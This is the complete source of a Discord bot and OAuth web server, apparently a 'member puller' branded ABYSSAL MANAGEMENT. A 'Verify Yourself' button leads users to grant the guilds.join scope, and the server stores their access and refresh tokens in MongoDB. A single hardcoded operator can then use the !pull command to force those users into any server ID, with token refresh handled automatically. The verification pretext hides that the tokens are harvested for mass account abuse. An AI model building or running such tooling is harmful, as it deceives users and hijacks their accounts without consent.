const dns = require('dns');
dns.setServers(['8.8.8.8', '1.1.1.1']); // Force ultra-fast public DNS resolution

const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const path = require('path');
require('dotenv').config();

// --- 1. EXPRESS & MONGODB SETUP ---
const app = express();
app.use(express.json());

const PORT = process.env.PORT || 16867;
const MONGO_URI = process.env.MONGO_URI;

// Connect to MongoDB with high-speed fail timeout
mongoose.connect(MONGO_URI, {
    serverSelectionTimeoutMS: 5000,
    connectTimeoutMS: 10000,
})
.then(() => console.log('⚡ [DATABASE] Connected to MongoDB Atlas successfully!'))
.catch(err => console.error('❌ [DATABASE ERROR]:', err.message));

// Define Token Schema & Model
const tokenSchema = new mongoose.Schema({
    userId: { type: String, required: true, unique: true },
    username: String,
    accessToken: String,
    refreshToken: { type: String, required: true },
    expiresAt: { type: Number, required: true }
});
const Token = mongoose.model('Token', tokenSchema);

// Keep-Alive Route for Free Cloud Hosting (Prevents Render/PaaS Spin-Down)
app.get('/', (req, res) => {
    res.status(200).send({
        status: 'ONLINE 🚀',
        system: 'ABYSSAL MANAGEMENT // OAuth Core Matrix',
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// Verification Route (Redirects user to Discord OAuth)
app.get('/verify', (req, res) => {
    if (!process.env.CLIENT_ID || !process.env.REDIRECT_URI) {
        return res.status(500).send('❌ OAuth Configuration Error: Missing CLIENT_ID or REDIRECT_URI in environment variables.');
    }
    const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
    res.redirect(authUrl);
});

// OAuth2 Callback Route
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.status(400).send('❌ No authorization code provided.');

    try {
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: process.env.REDIRECT_URI,
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const { access_token, refresh_token, expires_in } = tokenResponse.data;

        // Get User Discord Profile
        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` }
        });
        const userId = userResponse.data.id;
        const username = userResponse.data.username;

        // Upsert tokens into MongoDB
        await Token.findOneAndUpdate(
            { userId },
            {
                username,
                accessToken: access_token,
                refreshToken: refresh_token,
                expiresAt: Date.now() + (expires_in * 1000)
            },
            { upsert: true, new: true }
        );

        res.sendFile(path.join(__dirname, 'public', 'success.html'));
    } catch (error) {
        console.error('❌ Callback error:', error.response?.data || error.message);
        res.status(500).send('❌ Authentication failed. Please try verifying again.');
    }
});

app.listen(PORT, () => {
    console.log(`🚀 [WEB SERVER] Running live on port ${PORT}`);
});

// --- 2. DISCORD BOT SETUP ---
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildMembers
    ]
});

const AUTHORIZED_USER_ID = '1370594462941581433';
const pendingPulls = new Map();

client.once('ready', () => {
    console.log(`🤖 [DISCORD BOT] Online and locked in as ⚡ ${client.user.tag}!`);
});

// Helper to refresh tokens automatically if expired
async function getValidAccessToken(tokenDoc) {
    if (Date.now() < tokenDoc.expiresAt) {
        return tokenDoc.accessToken;
    }

    try {
        const refreshResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET,
            grant_type: 'refresh_token',
            refresh_token: tokenDoc.refreshToken,
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        tokenDoc.accessToken = refreshResponse.data.access_token;
        tokenDoc.refreshToken = refreshResponse.data.refresh_token || tokenDoc.refreshToken;
        tokenDoc.expiresAt = Date.now() + (refreshResponse.data.expires_in * 1000);
        await tokenDoc.save();

        return tokenDoc.accessToken;
    } catch (error) {
        console.error(`❌ Failed to refresh token for user ${tokenDoc.userId}:`, error.response?.data || error.message);
        return null;
    }
}

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    const args = message.content.trim().split(/\s+/);
    const command = args[0].toLowerCase();

    // 1. !verify Command (Slick Minimalist Embed)
    if (command === '!verify') {
        if (message.guild) {
            await message.delete().catch(() => {});
        }

        const verifyEmbed = new EmbedBuilder()
            .setColor('#7c3aed')
            .setTitle('⚡ Verify Yourself')
            .setDescription('Click the button below to complete your verification process securely.')
            .setFooter({ text: '🛡️ Verification Security System' })
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('Verify')
                .setStyle(ButtonStyle.Link)
                .setURL(`${process.env.PUBLIC_URL}/verify`)
        );

        return message.channel.send({ embeds: [verifyEmbed], components: [row] });
    }

    // 2. !stats Command (God-Tier Cyberpunk Telemetry with Emoji Suite)
    if (command === '!stats') {
        if (message.guild) {
            await message.delete().catch(() => {});
        }

        const loadingMsg = await message.channel.send('🔮 **Initializing Quantum Telemetry Scan...** Please stand by ⚡');

        try {
            if (mongoose.connection.readyState !== 1) {
                return loadingMsg.edit('❌ **Database Disconnected:** MongoDB Atlas cluster is offline.');
            }

            const totalTokens = await Token.countDocuments();
            
            if (totalTokens === 0) {
                return loadingMsg.edit('⚠️ **Database Empty:** Zero verified sessions logged in MongoDB.');
            }

            const allTokens = await Token.find({}, { userId: 1 });
            let onlineCount = 0, idleCount = 0, dndCount = 0, offlineCount = 0;

            for (const tokenDoc of allTokens) {
                let userStatus = 'offline';
                for (const [, guild] of client.guilds.cache) {
                    const member = guild.members.cache.get(tokenDoc.userId);
                    if (member && member.presence) {
                        userStatus = member.presence.status;
                        break;
                    }
                }
                if (userStatus === 'online') onlineCount++;
                else if (userStatus === 'idle') idleCount++;
                else if (userStatus === 'dnd') dndCount++;
                else offlineCount++;
            }

            // System Metrics
            const memoryUsage = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
            const uptimeSeconds = Math.floor(process.uptime());
            const hours = Math.floor(uptimeSeconds / 3600);
            const minutes = Math.floor((uptimeSeconds % 3600) / 60);

            const statsEmbed = new EmbedBuilder()
                .setTitle('📊 ABYSSAL // Neural Telemetry Matrix')
                .setColor('#00ffcc')
                .setDescription('💎 Real-time diagnostic metrics across database nodes and active sessions.')
                .addFields(
                    { name: '🧬 Total Verified Users', value: `\`${totalTokens}\``, inline: false },
                    { name: '🟢 Online', value: `\`${onlineCount}\``, inline: true },
                    { name: '🟡 Idle', value: `\`${idleCount}\``, inline: true },
                    { name: '🔴 Do Not Disturb', value: `\`${dndCount}\``, inline: true },
                    { name: '⚫ Offline / Cached', value: `\`${offlineCount}\``, inline: true },
                    { name: '📡 API Latency', value: `\`${client.ws.ping}ms\``, inline: true },
                    { name: '💻 RAM Heap', value: `\`${memoryUsage} MB\``, inline: true },
                    { name: '⏳ Core Uptime', value: `\`${hours}h ${minutes}m\``, inline: true },
                    { name: '⚡ Database Status', value: '`Connected & Stable (Atlas)`', inline: false }
                )
                .setFooter({ text: 'ABYSSAL MANAGEMENT • Secure Telemetry v3.5' })
                .setTimestamp();

            return loadingMsg.edit({ content: '', embeds: [statsEmbed] });

        } catch (error) {
            console.error('❌ Stats command error:', error);
            return loadingMsg.edit('❌ **Critical Error:** Failed to compile system telemetry.');
        }
    }

    // 3. !pull Command (Authorized Operator Only)
    if (command === '!pull') {
        if (message.author.id !== AUTHORIZED_USER_ID) {
            return message.reply("🚫 **Access Denied:** You lack security clearance for this protocol.");
        }

        const targetGuildId = args[1];
        const requestedLimit = parseInt(args[2], 10);

        if (!targetGuildId || isNaN(requestedLimit) || requestedLimit <= 0) {
            return message.reply('⚠️ **Syntax Error:** `!pull <ServerID> <Amount>`\nExample: `!pull 123456789012345678 50`');
        }

        if (mongoose.connection.readyState !== 1) {
            return message.reply('❌ **Database Error:** MongoDB connection lost.');
        }

        const totalAvailableTokens = await Token.countDocuments();
        
        if (totalAvailableTokens === 0) {
            return message.reply('❌ **Error:** No tokens found in the database!');
        }

        const actualLimit = Math.min(requestedLimit, totalAvailableTokens);
        const hasCapacityWarning = requestedLimit > totalAvailableTokens;

        pendingPulls.set(message.author.id, { 
            targetGuildId, 
            limit: actualLimit, 
            requested: requestedLimit,
            totalAvailable: totalAvailableTokens 
        });

        const embed = new EmbedBuilder()
            .setTitle('⚡ ABYSSAL // Pull Protocol Authorization')
            .setColor(hasCapacityWarning ? '#f59e0b' : '#7c3aed')
            .addFields(
                { name: '🎯 Target Guild ID', value: `\`${targetGuildId}\``, inline: true },
                { name: '📊 Requested Amount', value: `\`${requestedLimit}\``, inline: true },
                { name: '📁 Available Tokens', value: `\`${actualLimit}\` / \`${totalAvailableTokens}\``, inline: true }
            )
            .setTimestamp();

        if (hasCapacityWarning) {
            embed.setDescription(`⚠️ **Capacity Notice:** You requested **${requestedLimit}**, but only **${totalAvailableTokens}** tokens are available. The bot will deploy all **${actualLimit}** available units.`);
        } else {
            embed.setDescription(`Click confirm below to execute deployment of **${actualLimit}** verified units.`);
        }

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('pull_confirm')
                .setLabel(`🚀 Confirm (${actualLimit} Units)`)
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId('pull_cancel')
                .setLabel('🛑 Abort')
                .setStyle(ButtonStyle.Danger)
        );

        try {
            await message.author.send({ embeds: [embed], components: [row] });
            return message.reply(`📬 **Secure Dispatch Sent:** Check your Direct Messages to authorize the pull operation.`);
        } catch (err) {
            console.error('❌ DM Dispatch Failed:', err);
            return message.reply('❌ **DM Blocked:** Please enable **Direct Messages from server members** in your Discord settings!');
        }
    }
});

// --- 4. INTERACTION BUTTON HANDLER ---
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    if (interaction.user.id !== AUTHORIZED_USER_ID) return;

    const { customId } = interaction;

    if (customId === 'pull_cancel') {
        pendingPulls.delete(interaction.user.id);
        return interaction.update({
            content: '🛑 **Protocol Aborted:** Pull sequence safely cancelled.',
            embeds: [],
            components: []
        });
    }

    if (customId === 'pull_confirm') {
        const pullData = pendingPulls.get(interaction.user.id);
        if (!pullData) {
            return interaction.update({
                content: '⚠️ **Session Expired:** No active pull request found.',
                embeds: [],
                components: []
            });
        }

        pendingPulls.delete(interaction.user.id);

        await interaction.update({
            content: `🚀 **Deploying Protocol:** Processing **${pullData.limit}** units into target \`${pullData.targetGuildId}\`...\n*Please wait...*`,
            embeds: [],
            components: []
        });

        const allTokens = await Token.find().limit(pullData.limit);
        let successCount = 0;
        let failCount = 0;

        for (const tokenDoc of allTokens) {
            try {
                const accessToken = await getValidAccessToken(tokenDoc);
                if (!accessToken) {
                    failCount++;
                    continue;
                }

                await axios.put(`https://discord.com/api/v10/guilds/${pullData.targetGuildId}/members/${tokenDoc.userId}`, {
                    access_token: accessToken
                }, {
                    headers: {
                        Authorization: `Bot ${process.env.BOT_TOKEN}`,
                        'Content-Type': 'application/json'
                    }
                });

                successCount++;
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (err) {
                console.error(`❌ Error adding user ${tokenDoc.userId}:`, err.response?.data || err.message);
                failCount++;
            }
        }

        const resultEmbed = new EmbedBuilder()
            .setTitle('🔥 ABYSSAL // Execution Report Complete')
            .setColor('#10b981')
            .addFields(
                { name: '🎯 Target Guild ID', value: `\`${pullData.targetGuildId}\``, inline: true },
                { name: '✅ Successful Joins', value: `\`${successCount}\``, inline: true },
                { name: '❌ Failed / Expired', value: `\`${failCount}\``, inline: true }
            )
            .setFooter({ text: 'ABYSSAL MANAGEMENT • Mission Accomplished' })
            .setTimestamp();

        await interaction.followUp({ embeds: [resultEmbed] });
    }
});

client.login(process.env.BOT_TOKEN);
